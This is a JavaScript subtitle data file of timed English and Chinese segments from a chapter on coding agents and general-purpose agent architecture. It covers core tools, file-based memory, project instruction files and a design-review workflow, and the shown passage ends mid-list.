window.CHAPTER_DATA_chapter5 = [
  {
    "id": 1,
    "start": 0.1,
    "end": 4.512,
    "en": "Chapter 5: Coding Agents and General-Purpose Agents .",
    "zh": "第5章：代码智能体与通用智能体。"
  },
  {
    "id": 2,
    "start": 4.462,
    "end": 12.35,
    "en": "The previous chapters delved into context engineering (Chapters 2 and 3) and tool design (Chapter 4).",
    "zh": "前几章深入探讨了上下文工程（第2章和第3章）以及工具设计（第4章）。"
  },
  {
    "id": 3,
    "start": 12.35,
    "end": 22.312,
    "en": "This chapter puts those building blocks together to answer a core question: What does the architecture of a general-purpose Agent capable of handling arbitrary tasks look like?",
    "zh": "本章将这些构建模块整合在一起，以回答一个核心问题：一个能够处理任意任务的通用智能体的架构是什么样子？"
  },
  {
    "id": 4,
    "start": 22.312,
    "end": 43.212,
    "en": "The answer is: A general-purpose Agent targeting open-ended tasks has at its core a Coding Agent (an Agent that can autonomously write, modify, and execute code) plus a file system — the workspace where the Agent stores code, data, memory, and intermediate results, much as a programmer manages projects with folders on a computer.",
    "zh": "答案是：针对开放性任务的通用智能体的核心是一个代码智能体（能够自主编写、修改和执行代码的智能体）加上一个文件系统——这是智能体存储代码、数据、记忆和中间结果的工作空间，就像程序员通过计算机上的文件夹管理项目一样。"
  },
  {
    "id": 5,
    "start": 43.212,
    "end": 49.662,
    "en": "From Manus to OpenClaw, successful open-ended general-purpose Agents all follow this paradigm.",
    "zh": "从Manus到OpenClaw，所有成功的开放性通用智能体都遵循这一范式。"
  },
  {
    "id": 6,
    "start": 49.662,
    "end": 52.75,
    "en": "Why can code generation carry this weight?",
    "zh": "为什么代码生成能承担如此重任？"
  },
  {
    "id": 7,
    "start": 52.75,
    "end": 61.15,
    "en": "Because it is not merely a tool, but a meta-capability — the ability to create new tools and capabilities dynamically at runtime.",
    "zh": "因为它不仅仅是一个工具，而是一种元能力——在运行时动态创建新工具和能力的能力。"
  },
  {
    "id": 8,
    "start": 61.15,
    "end": 67.962,
    "en": "The latter half of this chapter develops this concept in full, along with the six directions in which it applies.",
    "zh": "本章后半部分将全面阐述这一概念，并介绍其六个应用方向。"
  },
  {
    "id": 9,
    "start": 67.962,
    "end": 71.037,
    "en": "Code serves an Agent on two levels.",
    "zh": "代码对智能体而言有两个层面的作用。"
  },
  {
    "id": 10,
    "start": 71.037,
    "end": 82.325,
    "en": "As a medium for thinking, code enforces rigor — \"age greater than 18 and identity verified\" admits multiple readings in natural language, but written as code it admits exactly one.",
    "zh": "作为思考的媒介，代码具有强制的严谨性——“年龄大于18岁且身份已验证”在自然语言中可能有多种解读，但写成代码则只有一种解释。"
  },
  {
    "id": 11,
    "start": 82.325,
    "end": 91.887,
    "en": "As a medium for expression, code that runs is its own proof of logical consistency, and its execution result provides an objective standard of correctness.",
    "zh": "作为表达的媒介，运行的代码本身就是逻辑一致性的证明，其执行结果提供了客观的正确性标准。"
  },
  {
    "id": 12,
    "start": 91.887,
    "end": 108.037,
    "en": "This chapter begins with the basic capabilities of a Coding Agent and the general-purpose Agent architecture (OpenClaw), then demonstrates the application of code generation in various scenarios — from mathematical reasoning and content creation to system-level meta-capabilities.",
    "zh": "本章首先介绍代码智能体和通用智能体架构（OpenClaw）的基本能力，然后演示代码生成在各种场景中的应用——从数学推理和内容创作到系统级的元能力。"
  },
  {
    "id": 13,
    "start": 108.037,
    "end": 109.862,
    "en": "Coding Agent.",
    "zh": "代码智能体。"
  },
  {
    "id": 14,
    "start": 109.862,
    "end": 113.262,
    "en": "Coding as a Foundational Agent Capability.",
    "zh": "代码作为基础智能体能力。"
  },
  {
    "id": 15,
    "start": 113.262,
    "end": 122.462,
    "en": "Code generation is not the exclusive domain of a few specialized Agents, but a foundational capability that every general-purpose Agent should possess.",
    "zh": "代码生成并非少数特定智能体的专属领域，而是每个通用智能体都应该具备的基础能力。"
  },
  {
    "id": 16,
    "start": 122.462,
    "end": 129.075,
    "en": "With today's SOTA models, giving an Agent basic coding ability requires no elaborate architecture.",
    "zh": "凭借当今的SOTA模型，为智能体提供基本的编码能力无需复杂的架构。"
  },
  {
    "id": 17,
    "start": 129.075,
    "end": 138.0,
    "en": "Consider a typical task: \"Organize all leftover TODO comments in the repository, classify them by priority, and generate issues.",
    "zh": "考虑一个典型任务：\"整理仓库中所有剩余的TODO注释，按优先级分类并生成问题。\""
  },
  {
    "id": 18,
    "start": 138.0,
    "end": 152.012,
    "en": "Getting it done requires browsing the directory structure (ls/glob), reading code (read), modifying files (edit/write), running commands (bash), and searching for patterns (grep/search).",
    "zh": "完成这项任务需要浏览目录结构（ls/glob）、读取代码（read）、修改文件（edit/write）、运行命令（bash）以及搜索模式（grep/search）。"
  },
  {
    "id": 19,
    "start": 152.012,
    "end": 160.325,
    "en": "These five categories of operations cover almost every core action of a Coding Agent, and they are where the seven tools below come from.",
    "zh": "这五类操作几乎涵盖了编码智能体的所有核心动作，也是下面七个工具的来源。"
  },
  {
    "id": 20,
    "start": 160.325,
    "end": 180.15,
    "en": "Strictly speaking, the five categories map naturally onto six tools; the seventh, the Code Interpreter, covers \"execute code / compute\" operations and in some implementations is simply folded into Bash — the seven tools are a normalized reference set, not a strict one-to-one mapping onto the five categories.",
    "zh": "严格来说，这五类操作自然映射到六个工具；第七个工具，代码解释器，负责\"执行代码/计算\"操作，在某些实现中只是简单地整合到Bash中——这七个工具是一个标准化的参考集合，而不是对五类操作的严格一一对应映射。"
  },
  {
    "id": 21,
    "start": 180.15,
    "end": 185.587,
    "en": "A basic Coding Agent only needs to be equipped with the following seven core tools:",
    "zh": "一个基本的编码智能体只需要配备以下七个核心工具："
  },
  {
    "id": 22,
    "start": 185.587,
    "end": 197.262,
    "en": "Code Interpreter: Provides an isolated sandbox (a secure runtime separated from the host system) in which Python code can run safely without execution errors affecting the host",
    "zh": "代码解释器：提供一个隔离的沙盒（与主机系统分离的安全运行时），可以在其中安全运行Python代码，而不会因执行错误影响主机"
  },
  {
    "id": 23,
    "start": 197.262,
    "end": 204.862,
    "en": "Bash Shell: Executes commands in a terminal, such as running test cases or processing specially formatted files",
    "zh": "Bash Shell：在终端中执行命令，例如运行测试用例或处理特定格式的文件"
  },
  {
    "id": 24,
    "start": 204.862,
    "end": 211.9,
    "en": "Read File Tool: Reads code, configuration, documentation, logs, etc.",
    "zh": "读取文件工具：读取代码、配置、文档、日志等"
  },
  {
    "id": 25,
    "start": 211.9,
    "end": 217.762,
    "en": "Write File Tool: Creates new files or completely overwrites existing files",
    "zh": "写入文件工具：创建新文件或完全覆盖现有文件"
  },
  {
    "id": 26,
    "start": 217.762,
    "end": 226.175,
    "en": "Edit File Tool: Performs partial modifications to existing files, a core operation for code maintenance and iteration",
    "zh": "编辑文件工具：对现有文件进行部分修改，这是代码维护和迭代的核心操作"
  },
  {
    "id": 27,
    "start": 226.175,
    "end": 238.325,
    "en": "Search File Name Tool (Glob): Quickly locates target files in the file system via pattern matching, e.g., using */.py to find all Python files in a project",
    "zh": "搜索文件名工具（Glob）：通过模式匹配快速定位文件系统中的目标文件，例如使用*/.py查找项目中的所有Python文件"
  },
  {
    "id": 28,
    "start": 238.325,
    "end": 248.3,
    "en": "Search File Content Tool (Grep): Searches for specific text patterns within file content, e.g., finding all lines of code that call a certain function",
    "zh": "搜索文件内容工具（Grep）：在文件内容中搜索特定文本模式，例如查找调用某个函数的所有代码行"
  },
  {
    "id": 29,
    "start": 248.3,
    "end": 255.537,
    "en": "These seven tools constitute a complete yet minimal toolbox that almost any Agent system can integrate at low cost.",
    "zh": "这七个工具构成了一套完整但最小的工具箱，几乎任何智能体系统都可以以低成本集成"
  },
  {
    "id": 30,
    "start": 255.7,
    "end": 273.05,
    "en": "Note that this tool set is the base configuration specific to a Coding Agent, and differs from the five general tool categories of Chapter 4, which were divided by call direction and nature of effect (perception / execution / collaboration / event-triggered / user communication).",
    "zh": "请注意，这个工具集是编码智能体特有的基础配置，与第4章的五个通用工具类别不同，第4章的分类是根据调用方向和效果性质（感知/执行/协作/事件触发/用户通信）划分的。"
  },
  {
    "id": 31,
    "start": 273.0,
    "end": 277.425,
    "en": "These seven core tools mainly cover perception and execution.",
    "zh": "这七个核心工具主要涵盖感知和执行。"
  },
  {
    "id": 32,
    "start": 277.425,
    "end": 286.762,
    "en": "Collaboration, event handling, and user communication still require additional tools, but those fall outside a Coding Agent's core tool set.",
    "zh": "协作、事件处理和用户沟通仍需要额外的工具，但这些超出了代码智能体的核心工具集范围。"
  },
  {
    "id": 33,
    "start": 286.762,
    "end": 291.7,
    "en": "To see how the seven tools work together, take the simplest of tasks.",
    "zh": "要了解这七个工具如何协同工作，请以最简单的任务为例。"
  },
  {
    "id": 34,
    "start": 291.7,
    "end": 297.387,
    "en": "Suppose the user says, \"Help me compile a list of all TODO comments in the project\"",
    "zh": "假设用户说：'帮我列出项目中所有的TODO注释'"
  },
  {
    "id": 35,
    "start": 297.387,
    "end": 302.125,
    "en": "Refer to the companion repository for the complete code implementation.",
    "zh": "请参考配套仓库中的完整代码实现。"
  },
  {
    "id": 36,
    "start": 302.125,
    "end": 309.175,
    "en": "The entire process used only two tools: Grep (search content) and Write (write file).",
    "zh": "整个过程只使用了两个工具：Grep（搜索内容）和Write（写文件）。"
  },
  {
    "id": 37,
    "start": 309.175,
    "end": 321.037,
    "en": "If the task were more complex — like \"count the number of TODOs per module and draw a bar chart\" — the Agent would also use the Code Interpreter to execute Python code for statistics and plotting.",
    "zh": "如果任务更复杂——例如‘按模块统计TODO数量并绘制柱状图’——智能体还将使用代码解释器来执行Python代码进行统计和绘图。"
  },
  {
    "id": 38,
    "start": 321.037,
    "end": 327.412,
    "en": "The seven tools are simple individually; in combination they cover a remarkable range of tasks.",
    "zh": "这七个工具单独来看很简单；但组合起来可以覆盖相当广泛的任务。"
  },
  {
    "id": 39,
    "start": 327.412,
    "end": 331.675,
    "en": "A reader might ask: why seven tools and not six?",
    "zh": "读者可能会问：为什么是七个工具而不是六个？"
  },
  {
    "id": 40,
    "start": 331.675,
    "end": 336.225,
    "en": "In fact, a single Bash tool can cover most operations.",
    "zh": "事实上，一个Bash工具可以覆盖大部分操作。"
  },
  {
    "id": 41,
    "start": 336.225,
    "end": 359.112,
    "en": "OpenAI Codex's toolset is extremely lean: the shell is its only general-purpose execution entry point, and it browses directories, finds files, and reads them through commands; file modifications go to a syntax-constrained apply_patch tool, which expresses an edit as a structured patch rather than a free-form text command and so lowers the chance of changing the wrong file.",
    "zh": "OpenAI Codex的工具集非常精简：shell是其唯一的通用执行入口，它通过命令浏览目录、查找文件并读取它们；文件修改会通过一个语法受限的apply_patch工具进行，该工具通过结构化的补丁表达编辑，而不是自由格式的文本命令，从而降低了修改错误文件的可能性。"
  },
  {
    "id": 42,
    "start": 359.112,
    "end": 364.3,
    "en": "Other Agents nevertheless keep dedicated file-reading and file-writing tools.",
    "zh": "然而其他智能体仍然保留专门的文件读取和文件写入工具。"
  },
  {
    "id": 43,
    "start": 364.3,
    "end": 371.55,
    "en": "The seven tools in this book are broken out separately to make the basic capabilities a Coding Agent needs easy to grasp.",
    "zh": "本书中的七个工具被单独列出，以便让代码智能体所需的基本能力更容易掌握。"
  },
  {
    "id": 44,
    "start": 371.55,
    "end": 375.287,
    "en": "Why should every general-purpose Agent have coding ability?",
    "zh": "为什么每个通用智能体都应该具备编码能力？"
  },
  {
    "id": 45,
    "start": 375.287,
    "end": 382.225,
    "en": "Because code generation is not just about writing programs — it is a general-purpose way of solving problems.",
    "zh": "因为代码生成不仅仅是编写程序——它是解决问题的一种通用方法。"
  },
  {
    "id": 46,
    "start": 382.225,
    "end": 400.712,
    "en": "Faced with a math problem, the Agent can write code and hand it to a solver for an exact answer; faced with a business rule to pin down, code is far more precise than any natural-language description; missing a tool, it can write one on the spot; when a data format changes, it can generate new parsing logic.",
    "zh": "面对数学问题，智能体可以编写代码并将其交给求解器以获得精确答案；面对需要明确的业务规则，代码比任何自然语言描述都更精确；缺少工具时，它可以现场编写一个；当数据格式发生变化时，它可以生成新的解析逻辑。"
  },
  {
    "id": 47,
    "start": 400.712,
    "end": 404.587,
    "en": "Later sections take up each of these scenarios in turn.",
    "zh": "后续部分将逐一探讨这些场景。"
  },
  {
    "id": 48,
    "start": 404.587,
    "end": 414.5,
    "en": "An Agent with basic coding ability — even one equipped with nothing but the seven simple tools above — can expand its capabilities whenever a new need arises.",
    "zh": "具备基本编码能力的智能体——即使只配备了上述七种简单工具——也能在出现新需求时扩展其能力。"
  },
  {
    "id": 49,
    "start": 414.5,
    "end": 420.4,
    "en": "Case Study: From Manus to OpenClaw — The Coding Core of General-Purpose Agents.",
    "zh": "案例研究：从Manus到OpenClaw——通用智能体的编码核心。"
  },
  {
    "id": 50,
    "start": 420.4,
    "end": 430.775,
    "en": "General-purpose Agent products such as Manus and OpenClaw combine three major capabilities — Deep Research, Computer Use, and Coding — in a single system.",
    "zh": "通用智能体产品如Manus和OpenClaw将三大核心能力——深度研究、计算机使用和编码——整合到一个系统中。"
  },
  {
    "id": 51,
    "start": 430.775,
    "end": 437.225,
    "en": "Why, then, did the beginning of this chapter call the Coding Agent the core rather than either of the other two?",
    "zh": "那么，为什么本章开头称编码智能体为核心，而不是另外两个能力呢？"
  },
  {
    "id": 52,
    "start": 437.225,
    "end": 442.425,
    "en": "Because almost all efficient content generation ultimately boils down to code.",
    "zh": "因为几乎所有高效的的内容生成最终都可以归结为代码。"
  },
  {
    "id": 53,
    "start": 442.425,
    "end": 452.65,
    "en": "PowerPoint presentations and Word documents are essentially code in the OOXML format (Office Open XML, Microsoft's open standard for office documents).",
    "zh": "PowerPoint演示文稿和Word文档本质上是OOXML格式（Office Open XML，微软的办公文档开放标准）中的代码。"
  },
  {
    "id": 54,
    "start": 452.65,
    "end": 469.2,
    "en": "PDF reports can be generated through Markdown, HTML, or LaTeX; Python scripts can perform data analysis and visualization; even successful browser-operation sequences from GUI work can be captured as reusable code (see Chapter 9).",
    "zh": "PDF报告可以通过Markdown、HTML或LaTeX生成；Python脚本可以执行数据分析和可视化；甚至成功的GUI操作序列也可以捕获为可重用的代码（参见第9章）。"
  },
  {
    "id": 55,
    "start": 469.2,
    "end": 475.787,
    "en": "Deep Research search and information synthesis can be implemented through code-driven web requests and parsing.",
    "zh": "深度研究的搜索和信息综合可以通过代码驱动的网络请求和解析来实现。"
  },
  {
    "id": 56,
    "start": 475.787,
    "end": 485.125,
    "en": "Computer Use is more versatile, but direct code or API calls are generally cheaper, faster, and more reliable for equivalent operations.",
    "zh": "计算机使用更具多样性，但直接的代码或API调用通常在同等操作下成本更低、速度更快且更可靠。"
  },
  {
    "id": 57,
    "start": 485.125,
    "end": 491.612,
    "en": "Code generation is the most efficient, lowest-cost, and most reusable capability foundation.",
    "zh": "代码生成是最高效、成本最低且最可重用的能力基础。"
  },
  {
    "id": 58,
    "start": 491.612,
    "end": 497.637,
    "en": "As illustrated in Figure 5-1: Coding Agent Core in OpenClaw Architecture.",
    "zh": "如图5-1所示：OpenClaw架构中的编码智能体核心。"
  },
  {
    "id": 59,
    "start": 497.637,
    "end": 501.887,
    "en": "Understand this architecture through a concrete execution flow.",
    "zh": "通过具体的执行流程理解这一架构。"
  },
  {
    "id": 60,
    "start": 501.887,
    "end": 508.35,
    "en": "Suppose the user asks: \"Help me analyze last quarter's sales data and create a summary report.",
    "zh": "假设用户提问：\"帮我分析上季度的销售数据并创建一份摘要报告。"
  },
  {
    "id": 61,
    "start": 508.35,
    "end": 517.212,
    "en": "Read Memory: The Agent reads MEMORY.md and discovers the user prefers PDF format reports and the data source is Google Sheets",
    "zh": "读取记忆：智能体读取MEMORY.md，发现用户偏好PDF格式的报告，数据来源是Google Sheets"
  },
  {
    "id": 62,
    "start": 517.372,
    "end": 526.359,
    "en": "Call Tools: Obtains usage instructions for the Google Sheets API via the web search module, downloads data via code execution",
    "zh": "调用工具：通过网络搜索模块获取Google Sheets API的使用说明，通过代码执行下载数据"
  },
  {
    "id": 63,
    "start": 526.309,
    "end": 533.959,
    "en": "Write Code: Generates a data analysis script in Python (pandas aggregation, matplotlib visualization)",
    "zh": "编写代码：生成Python数据分析师脚本（pandas聚合，matplotlib可视化）"
  },
  {
    "id": 64,
    "start": 533.959,
    "end": 541.534,
    "en": "Generate Artifacts: Writes the analysis results to report.pdf, charts to the charts/ directory",
    "zh": "生成产物：将分析结果写入report.pdf，图表写入charts/目录"
  },
  {
    "id": 65,
    "start": 541.534,
    "end": 551.359,
    "en": "Update Memory: Records in MEMORY.md that \"User's sales data is in Google Sheets, ID: xxx,\" so it doesn't need to ask next time",
    "zh": "更新记忆：在MEMORY.md中记录“用户的销售数据在Google Sheets，ID: xxx”，这样下次就不需要再询问"
  },
  {
    "id": 66,
    "start": 551.359,
    "end": 562.534,
    "en": "Throughout the process, the file system is the hub of information flow — memory is read from files, artifacts are written to files, and experience is also saved as files.",
    "zh": "在整个过程中，文件系统是信息流的中心——记忆从文件中读取，产物写入文件，经验也以文件形式保存。"
  },
  {
    "id": 67,
    "start": 562.534,
    "end": 565.772,
    "en": "The File System as the Agent's Central Hub.",
    "zh": "文件系统作为智能体的中心枢纽。"
  },
  {
    "id": 68,
    "start": 565.772,
    "end": 574.997,
    "en": "In OpenClaw's design, the file system is far more than data storage — it is the central hub for the Agent's memory, knowledge, and capabilities.",
    "zh": "在OpenClaw的设计中，文件系统远不止是数据存储——它是智能体记忆、知识和能力的中心枢纽。"
  },
  {
    "id": 69,
    "start": 574.997,
    "end": 583.972,
    "en": "The Agent's long-term memory is stored in MEMORY.md (high-level facts and user preferences) and Markdown logs archived by date.",
    "zh": "智能体的长期记忆存储在MEMORY.md（高级事实和用户偏好）以及按日期归档的Markdown日志中。"
  },
  {
    "id": 70,
    "start": 583.972,
    "end": 606.322,
    "en": "Choosing Markdown over a vector database may seem counterintuitive, but it is extremely effective: users can directly open files to read and modify the Agent's memory (if the Agent misremembers something, just delete that line), Markdown naturally preserves chronological order to avoid temporal confusion in semantic retrieval, and it supports version control and rollback via Git.",
    "zh": "选择Markdown而非向量数据库看似不合常理，但效果极佳：用户可以直接打开文件阅读和修改智能体的记忆（如果智能体记错了，只需删除该行），Markdown自然地保留时间顺序，避免语义检索中的时间混淆，并通过Git支持版本控制和回滚。"
  },
  {
    "id": 71,
    "start": 606.322,
    "end": 614.009,
    "en": "More critically, because the Agent can write files, it has the technical means to modify its own external artifacts.",
    "zh": "更重要的是，由于智能体可以写入文件，它具备了修改自身外部产物的技术手段。"
  },
  {
    "id": 72,
    "start": 614.009,
    "end": 629.497,
    "en": "When an Agent performs a task for the first time and discovers key information it did not previously know—for example, when calling a particular bank, it learns that the bank requires the branch address for identity verification—it can first write the discovery into a record.",
    "zh": "当智能体首次执行任务并发现之前未知的关键信息时——例如调用某家银行时，得知该银行需要分行地址进行身份验证——它可以首先将发现记录下来。"
  },
  {
    "id": 73,
    "start": 629.497,
    "end": 639.247,
    "en": "Determining when such a record is sufficient to become reliable knowledge, an instruction, or a program still requires additional trajectories and outcome validation.",
    "zh": "确定这种记录何时足以成为可靠的知识、指令或程序，仍需要额外的轨迹和结果验证。"
  },
  {
    "id": 74,
    "start": 639.247,
    "end": 643.872,
    "en": "This is the problem of continuous evolution discussed in Chapter 9.",
    "zh": "这就是第9章讨论的持续进化问题。"
  },
  {
    "id": 75,
    "start": 643.872,
    "end": 648.859,
    "en": "Applicability Boundary: Which Agents Have Coding as Their Core Architecture.",
    "zh": "适用边界：哪些智能体以编码为核心架构。"
  },
  {
    "id": 76,
    "start": 648.859,
    "end": 666.059,
    "en": "The conclusion that \"the Coding Agent is the core of a general-purpose Agent\" mainly applies to general-purpose Agents targeting open-ended tasks — scenarios like deep research, content generation, and data processing, where task boundaries are uncertain and artifact forms are diverse.",
    "zh": "\"代码智能体是通用智能体的核心\"这一结论主要适用于针对开放性任务的通用智能体——例如深度研究、内容生成和数据处理等场景，这些场景的任务边界不确定，产出形式多样。"
  },
  {
    "id": 77,
    "start": 666.059,
    "end": 680.959,
    "en": "In these scenarios, it is impossible to enumerate all needed tools in advance; code generation, as a meta-capability, provides the most economical path for dynamically expanding capability boundaries, making it the core of the architecture.",
    "zh": "在这些场景中，无法提前枚举所有需要的工具；代码生成作为一种元能力，为动态扩展能力边界提供了最经济的路径，因此成为架构的核心。"
  },
  {
    "id": 78,
    "start": 680.959,
    "end": 697.447,
    "en": "By contrast, vertical-domain customer-service Agents operate in relatively closed task spaces, with core architectures built around fixed business processes, domain tools, and dialogue strategies; there, code is a tool in the toolbox rather than the architectural hub.",
    "zh": "相比之下，垂直领域客服智能体运行在相对封闭的任务空间中，其核心架构围绕固定业务流程、领域工具和对话策略构建；在这些场景中，代码只是工具箱中的一个工具，而非架构的核心。"
  },
  {
    "id": 79,
    "start": 697.447,
    "end": 707.709,
    "en": "However, even in the latter, coding is an important foundational capability: precise calculation, data processing, and rule verification all depend on it.",
    "zh": "然而，即使在后者中，编码仍然是一个重要的基础能力：精确计算、数据处理和规则验证都依赖于它。"
  },
  {
    "id": 80,
    "start": 707.709,
    "end": 710.997,
    "en": "The Overall Workflow of a Coding Agent.",
    "zh": "代码智能体的整体工作流程。"
  },
  {
    "id": 81,
    "start": 710.997,
    "end": 715.834,
    "en": "As illustrated in Figure 5-2: Coding Agent Workflow.",
    "zh": "如图5-2所示：代码智能体工作流程。"
  },
  {
    "id": 82,
    "start": 715.834,
    "end": 718.159,
    "en": "Project Documentation.",
    "zh": "项目文档。"
  },
  {
    "id": 83,
    "start": 718.159,
    "end": 723.159,
    "en": "A Coding Agent's work begins with a systematic understanding of the project.",
    "zh": "代码智能体的工作始于对项目的系统理解。"
  },
  {
    "id": 84,
    "start": 723.159,
    "end": 737.434,
    "en": "When an Agent first encounters a code repository, its first job is not to start modifying code but to build a cognitive framework for the whole project—just as a new engineer doesn't push code on day one, but starts by learning the lay of the land.",
    "zh": "当智能体首次遇到代码仓库时，它的首要任务不是开始修改代码，而是建立对整个项目的认知框架——就像新工程师在第一天不会提交代码，而是先了解项目的整体情况。"
  },
  {
    "id": 85,
    "start": 737.434,
    "end": 745.722,
    "en": "The Agent begins by checking whether the project has documentation—a README, architecture design documents, developer guides.",
    "zh": "智能体首先检查项目是否有文档——如README文件、架构设计文档和开发者指南。"
  },
  {
    "id": 86,
    "start": 745.722,
    "end": 750.647,
    "en": "If key documents are missing, the Agent should not start working blindly.",
    "zh": "如果关键文档缺失，智能体不应盲目开始工作。"
  },
  {
    "id": 87,
    "start": 750.647,
    "end": 764.072,
    "en": "It should systematically inspect the codebase, identify the main modules, core abstractions, and component dependencies, and draft an architecture overview, directory guide, and instructions for running tests.",
    "zh": "它应系统地检查代码库，识别主要模块、核心抽象和组件依赖，并起草架构概述、目录指南和测试运行说明。"
  },
  {
    "id": 88,
    "start": 764.072,
    "end": 770.734,
    "en": "These documents serve as a blueprint for the Agent's subsequent work and provide an entry point for other developers.",
    "zh": "这些文档为智能体后续的工作提供蓝图，并为其他开发者提供切入点。"
  },
  {
    "id": 89,
    "start": 770.734,
    "end": 777.634,
    "en": "This embodies a key principle: making project knowledge explicit is a prerequisite for efficient collaboration.",
    "zh": "这体现了关键原则：将项目知识显性化是高效协作的前提。"
  },
  {
    "id": 90,
    "start": 777.796,
    "end": 783.883,
    "en": "Project documentation now has a form specific to Agents: Project Instruction Files.",
    "zh": "项目文档现在有了适用于智能体的特定形式：项目指令文件。"
  },
  {
    "id": 91,
    "start": 783.833,
    "end": 797.246,
    "en": "Files like CLAUDE.md, AGENTS.md, .cursorrules have become de facto industry standards—they are automatically injected into the context at the start of every session, acting as project-level system prompts.",
    "zh": "像CLAUDE.md、AGENTS.md、.cursorrules这样的文件已成为事实上的行业标准——它们会在每个会话开始时自动注入上下文，作为项目级别的系统提示。"
  },
  {
    "id": 92,
    "start": 797.246,
    "end": 815.171,
    "en": "Unlike READMEs intended for human readers, instruction files carry behavior conventions for Agents: build and test commands (\"use pnpm test instead of npm test\"), code style (\"avoid the any type\"), and clear restricted zones (\"do not modify the migrations/ directory\").",
    "zh": "与面向人类读者的README不同，指令文件包含智能体的行为规范：构建和测试命令（“使用pnpm test而不是npm test”）、代码风格（“避免使用any类型”），以及明确的限制区域（“不要修改migrations/目录”）。“},{"
  },
  {
    "id": 93,
    "start": 815.171,
    "end": 834.096,
    "en": "This is the same idea as OpenClaw's SOUL.md (defining the Agent's identity and behavior rules) and MEMORY.md (accumulating cross-session experience), applied at different levels: SOUL.md defines \"who the Agent is,\" while project instruction files define \"how to work in this project.",
    "zh": "这与OpenClaw的SOUL.md（定义智能体的身份和行为规则）和MEMORY.md（积累跨会话经验）的理念相同，只是应用在不同层级：SOUL.md定义了“智能体是谁”，而项目说明文件则定义了“如何在这个项目中工作”。“},{"
  },
  {
    "id": 94,
    "start": 834.096,
    "end": 852.771,
    "en": "From the perspective of context engineering in Chapter 2, instruction files are also the most economical stable prefix—their content doesn't change with the task, making them naturally KV Cache-friendly; they are also the most direct implementation of the principle that \"knowledge must exist within the codebase itself.",
    "zh": "从第2章的上下文工程角度来看，指令文件也是最经济稳定的前缀——它们的内容不会随着任务变化，因此天然适合KV缓存；它们也是「知识必须存在于代码库本身」这一原则的最直接实现。"
  },
  {
    "id": 95,
    "start": 852.771,
    "end": 872.646,
    "en": "This is exactly where Chapter 2's judgment—\"a team friendly to remote work is usually friendly to AI Agents too\"—lands at the level of the code repository: decisions recorded in documents, context written into issue and PR descriptions, internal experience distilled into a developer guide, so that the Agent can read them at all.",
    "zh": "这正是第2章的判断——“对远程工作友好的团队通常也对AI Agent友好”——在代码仓库层面落地的地方：记录在文档中的决策、写入问题和PR描述中的上下文、提炼成开发者指南的内部经验，以便智能体能够阅读它们。"
  },
  {
    "id": 96,
    "start": 872.646,
    "end": 883.496,
    "en": "From this follows a simple gauge of how \"AI-ready\" a team is: can a remote newcomer, relying only on the repository and the documentation, start working independently?",
    "zh": "由此可以简单地衡量一个团队的「AI准备度」：一个远程的新成员，仅依靠代码仓库和文档，能否独立开始工作？"
  },
  {
    "id": 97,
    "start": 883.496,
    "end": 887.196,
    "en": "Task Understanding and Requirements Clarification.",
    "zh": "任务理解和需求澄清。"
  },
  {
    "id": 98,
    "start": 887.196,
    "end": 898.471,
    "en": "For simple requirements with clear boundaries and limited impact—such as fixing a known bug or adjusting a function's parameters—the Agent can proceed directly to the implementation phase.",
    "zh": "对于需求明确、边界清晰且影响范围有限的情况——比如修复一个已知的错误或调整一个函数的参数——智能体可以直接进入实现阶段。"
  },
  {
    "id": 99,
    "start": 898.471,
    "end": 902.996,
    "en": "However, most tasks in software development are not this simple.",
    "zh": "然而，软件开发中的大多数任务并不这么简单。"
  },
  {
    "id": 100,
    "start": 903.148,
    "end": 908.235,
    "en": "For complex requirements, the Agent must be more cautious and methodical.",
    "zh": "对于复杂的需求，智能体必须更加谨慎和有条理。"
  },
  {
    "id": 101,
    "start": 908.185,
    "end": 929.335,
    "en": "Complexity can arise from multiple dimensions: the ambiguity of the requirement itself (the user knows what they want but cannot express it precisely), the diversity of implementation paths (multiple technical solutions with their own trade-offs), or the breadth of impact (requiring modifications to multiple modules, potentially breaking existing functionality).",
    "zh": "复杂性可能来自多个维度：需求本身的模糊性（用户知道自己想要什么，但无法精确表达）、实现路径的多样性（多种技术解决方案各有权衡），或者影响范围的广泛性（需要修改多个模块，可能会破坏现有功能）。"
  },
  {
    "id": 102,
    "start": 929.335,
    "end": 937.16,
    "en": "The Agent should clarify boundaries through exploratory research and proactively engage in dialogue with the user when necessary.",
    "zh": "智能体应通过探索性研究明确边界，并在必要时主动与用户进行对话。"
  },
  {
    "id": 103,
    "start": 937.16,
    "end": 957.01,
    "en": "For example, when a user asks to \"optimize system performance,\" the Agent first needs to determine the specific goal (reducing response time, decreasing memory usage, or increasing throughput), which trade-offs are acceptable (for example, whether increased code complexity is acceptable), and where the current bottleneck lies.",
    "zh": "例如，当用户要求“优化系统性能”时，智能体首先需要确定具体目标（减少响应时间、降低内存使用或提高吞吐量），哪些权衡是可以接受的（例如，是否可以接受增加代码复杂度），以及当前的瓶颈在哪里。"
  },
  {
    "id": 104,
    "start": 957.01,
    "end": 962.523,
    "en": "Starting to code while the requirements are still vague often leads to significant rework.",
    "zh": "在需求仍然模糊的时候开始编写代码，往往会导致大量的返工。"
  },
  {
    "id": 105,
    "start": 962.523,
    "end": 964.948,
    "en": "Writing a Design Document.",
    "zh": "编写设计文档。"
  },
  {
    "id": 106,
    "start": 964.948,
    "end": 971.523,
    "en": "A design document is a bridge that translates abstract requirements into a concrete implementation plan.",
    "zh": "设计文档是将抽象需求转化为具体实施方案的桥梁。"
  },
  {
    "id": 107,
    "start": 971.523,
    "end": 984.923,
    "en": "It should answer four core questions: which modules should be modified and why, which approach should be chosen and what trade-offs it entails, which new dependencies are needed, and what impact the changes are expected to have on the system.",
    "zh": "它应该回答四个核心问题：哪些模块需要修改以及为什么，选择哪种方法以及它会带来哪些权衡，需要哪些新的依赖项，以及这些更改对系统预期会产生什么影响。"
  },
  {
    "id": 108,
    "start": 984.923,
    "end": 994.598,
    "en": "Writing a design document is itself deep thinking—it forces the Agent to conceptually validate the feasibility of a solution before investing heavily in coding.",
    "zh": "撰写设计文档本身就是一种深入思考——它迫使智能体在投入大量编码之前，对解决方案的可行性进行概念上的验证。"
  },
  {
    "id": 109,
    "start": 994.598,
    "end": 1005.323,
    "en": "More importantly, the design document provides an efficient intervention point for humans—reviewing a concise design document is much easier than reviewing hundreds of lines of code.",
    "zh": "更重要的是，设计文档为人提供了高效的干预点——审查一份简洁的设计文档比审查数百行代码要容易得多。"
  },
  {
    "id": 110,
    "start": 1005.323,
    "end": 1012.385,
    "en": "After completing the design document, the Agent should submit it for user review and wait for approval before proceeding.",
